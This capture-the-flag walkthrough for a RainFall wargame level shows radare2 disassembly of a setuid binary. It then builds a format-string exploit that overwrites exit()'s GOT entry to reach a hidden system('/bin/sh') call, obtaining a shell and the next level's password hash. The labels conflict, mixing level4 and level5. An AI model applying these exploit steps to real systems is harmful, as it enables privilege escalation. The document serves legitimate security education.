# Level4

As in level3, we can find an executable waiting for an input, print it and quit after press enter
```
level4@RainFall:~$ ls -l
total 8
-rwsr-s---+ 1 level5 users 5252 Mar  6  2016 level4
level4@RainFall:~$ ./level4
bla
bla
level4@RainFall:~$
```
After analyze it with radare2 (please refer to [level1](https://github.com/maxisimo/42-RainFall/blob/main/level1/walkthrough.md) if you want more details on the steps to follow)  
We can see that the `main()` function call a function named `n()` but there is also a non-called `o()` function.  
- main() :
```
[0x080483f0]> s main
[0x08048504]> pdda
    ; assembly                           | /* r2dec pseudo code output */
                                         | /* level5 @ 0x8048504 */
                                         | #include <stdint.h>
                                         |  
    ; (fcn) main ()                      | int32_t main (void) {
    0x08048504 push ebp                  |     
    0x08048505 mov ebp, esp              |
    0x08048507 and esp, 0xfffffff0       |
    0x0804850a call 0x80484c2            |     n ();
    0x0804850f leave                     |
    0x08048510 ret                       |
                                         | }
[0x08048504]>
```
- n() :
```
[0x08048504]> s sym.n
[0x080484c2]> pdda
    ; assembly                                   | /* r2dec pseudo code output */
                                                 | /* level5 @ 0x80484c2 */
                                                 | #include <stdint.h>
                                                 |
    ; (fcn) sym.n ()                             | int32_t n (void) {
                                                 |     char * format;
                                                 |     int32_t size;
                                                 |     FILE * stream;
    0x080484c2 push ebp                          |
    0x080484c3 mov ebp, esp                      |
    0x080484c5 sub esp, 0x218                    |
    0x080484cb mov eax, dword [0x8049848]        |     eax = stdin;
    0x080484d0 mov dword [esp + 8], eax          |     *((esp + 8)) = eax;
    0x080484d4 mov dword [esp + 4], 0x200        |     *((esp + 4)) = 0x200;
    0x080484dc lea eax, [ebp - 0x208]            |     eax = ebp - 0x208;
    0x080484e2 mov dword [esp], eax              |
    0x080484e5 call 0x80483a0                    |     fgets (ebp);
    0x080484ea lea eax, [ebp - 0x208]            |     eax = ebp - 0x208;
    0x080484f0 mov dword [esp], eax              |
    0x080484f3 call 0x8048380                    |     printf (eax);
    0x080484f8 mov dword [esp], 1                |
    0x080484ff call 0x80483d0                    |     return exit (1);
                                                 | }
[0x080484c2]>
```
- o() :
```
[0x080484c2]> s sym.o
[0x080484a4]> pdda
    ; assembly                                   | /* r2dec pseudo code output */
                                                 | /* level5 @ 0x80484a4 */
                                                 | #include <stdint.h>
                                                 |  
    ; (fcn) sym.o ()                             | void o (void) {
    0x080484a4 push ebp                          |     
    0x080484a5 mov ebp, esp                      |     
    0x080484a7 sub esp, 0x18                     |
    0x080484aa mov dword [esp], 0x80485f0        |
    0x080484b1 call 0x80483b0                    |     system ("/bin/sh");
    0x080484b6 mov dword [esp], 1                |
    0x080484bd call 0x8048390                    |     return exit (1);
                                                 | }
[0x080484a4]>
```
The `main()` only call `n()`, not very interesting so we can skip it.  
We can see a call to `fgets()`, in `n()`, wich is protect against buffer overflow attack.
```
    0x080484e5 call 0x80483a0                    |     fgets (ebp);
```
After that we can see a call to `printf()` function wich is vulnerable to format string exploit!
```
    0x080484f3 call 0x8048380                    |     printf (eax);
```
Then, the non-called function `o()` launch a shell via a call to `system()`.
```
    0x080484b1 call 0x80483b0                    |     system ("/bin/sh");
```
We need to manipulate `printf()` function into calling `o()` using a format string attack.  
Our main concern here is that both functions `n()` and `o()` never returns. It exits directly. Even if we overwrite something with format string vulnerability, we may not be able to use that.  
We can replace the address of exit in the GOT with the address of "o", for calling it instead of exit.  
The GOT (Global Offset Table) is a table of addresses in the data section, it contains the shared library functions addresses.  
Also GOT is writable and whenever the function `exit()` is called (GOT entry of the function is looked up first) the program will jump to that address.  
So if we replace the address of `exit()` in the GOT with the address of `o()` (with format strings), whenever that function will be called, the program will go to the modified GOT entry.  
First : find the address of `exit()` in the GOT and the address of the `o()` function.  
- exit():
```
level5@RainFall:~$ objdump -R level5 | grep exit
08049828 R_386_JUMP_SLOT   _exit
08049838 R_386_JUMP_SLOT   exit
level5@RainFall:~$
```
- o():
```
[0x080483f0]> afl
[...]
0x080484a4    1 30           sym.o
[0x080483f0]>
```
Now we have the address of `exit()`: 0x8049838 and the address of `o()`: 0x080484a4.  
We have to to print the memory until we reach the address of `exit()` :
```
level5@RainFall:~$ python -c 'print "aaaa" + " %x" * 10' > /tmp/exploit
level5@RainFall:~$ cat /tmp/exploit | ./level5
aaaa 200 b7fd1ac0 b7ff37d0 61616161 25207825 78252078 20782520 25207825 78252078 20782520
level5@RainFall:~$
```
The address of `exit()` is at the 4th position (`61616161`).  
Finally our final format string attack will look like :  
- exit() GOT address (in little endian) : `\x38\x98\x04\x08` (4 bytes)
- o() address in decimal : `134513824` (sub 4 bytes cause of the exit() address in GOT) with modifier `%d` + modifier `%n`
*It will be quite long cause of the big value in decimal of o() address*
```
level5@RainFall:~$ python -c 'print "\x38\x98\x04\x08" + "%134513824d%4$n"' > /tmp/exploit
level5@RainFall:~$ cat /tmp/exploit - | ./level5
                                                                                                                                                                                                              512
whoami
level6
cat /home/user/level6/.pass
d3b7bf1025225bd715fa8ccb54ef06ca70b9125ac855aeab4878217177f41a31
^C
level5@RainFall:~$ su level6
Password:
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      FILE
No RELRO        No canary found   NX disabled   No PIE          No RPATH   No RUNPATH   /home/user/level6/level6
level6@RainFall:~$
```
Level5 passed!
